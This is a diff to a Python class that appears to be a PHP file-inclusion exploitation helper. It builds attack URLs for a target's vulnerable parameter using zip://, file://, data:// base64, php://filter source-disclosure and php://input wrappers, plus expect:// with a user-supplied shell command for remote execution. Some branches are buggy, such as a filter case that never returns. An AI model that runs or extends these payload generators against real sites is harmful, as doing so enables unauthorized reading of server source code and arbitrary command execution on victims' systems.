@@ -1,16 +1,16 @@
 
+import sys
 
 
 class wrapper:
 
     __possible_wrappers={
-        "file":"file://",
-        "zip":"zip://datai"}
-
-    __template_values={
-
-        "zip":{"archive":None,"file":None}
-    }
+        "file":"datai",
+        "zip":"datai",
+        "input":"php://input",
+        "data":"datai",
+        "filter":"datai",
+        "expect":"datai"}
 
     def __init__(self,url,entry,wrapper):
         self.__url=url
@@ -21,15 +21,70 @@ class wrapper:
     def check_wrapper(self):
 
         keys = self.__possible_wrappers.keys()
+        str_cmd = None
+
+        if self.__wrapper == "all":
+
+            str_cmd = self.search_keys(keys)
+
+            if self.is_not_found(str_cmd) == True:
+                print("filter not found")
+            
+            print(str_cmd)
+
+        else:
+            str_cmd = self.search_keys(keys)
+
+            if self.is_not_found(str_cmd) == True:
+                print("filter not found")
+
+            print(str_cmd)
+
+    def elaborate(self,value):
+
+        if value == "zip":
+            str_zip = input("insert name of the zip archive: ")
+            str_filename = input("insert php filename: ")
+            str_cmd = "{}/?{}=zip://{}%32{}".format(str(self.__url),str(self.__entry),str(str_zip),str(str_filename))
+            return str_cmd
+        
+        if value == "file":
+            str_filename = input("insert php file name: ")
+            str_cmd = "{}/?{}=file://{}".format(str(self.__url),str(self.__entry),str(str_filename))
+            return str_cmd
+
+        if value == "data":
+            str_base64 = input("insert base64 content")
+            str_cmd = "{}/?{}=data://text/plain;base64,{}".format(str(self.__url),str(self.__entry),str(str_base64))
+            return str_cmd
+
+        if value == "filter":
+            str_resource = input("insert filename to filter: ")
+            str_cmd = "{}/?{}=php://filter/convert.base64-encode/resource={}".format(str(self.__url),str(self.__entry),str(str_resource))
+            pass
+
+        if value == "expect":
+            str_cmd = input("insert command to execute ")
+            str_cmd = "{}/?{}=expect://{}".format(str(self.__url),str(self.__entry),str(str_cmd))
+            return str_cmd
+
+        return "notfound"
+
+    def search_keys(self,keys):
 
         for value_key in keys:
             if self.__wrapper == value_key:
-                if self.__possible_wrappers.__contains__("datai"):
-                    pass
+                if self.__possible_wrappers[value_key] == "datai":
+                    str_cmd = self.elaborate(value_key)
                 else:
-                    str_cmd = "{}?{}={}".format(str(self.__url),str(self.__entry),self.__possible_wrappers[self.__wrapper])
-                
-                print(str_cmd)
+                    str_cmd = "{}/?{}={}".format(str(self.__url),str(self.__entry),self.__possible_wrappers[self.__wrapper])
+        
+        return str_cmd
+        
+    def is_not_found(self,str_cmd)->bool:
+         if(str_cmd == "notfound"):
+            return True
+         return False
 
     def set_url(self,url):
         self.__url = url
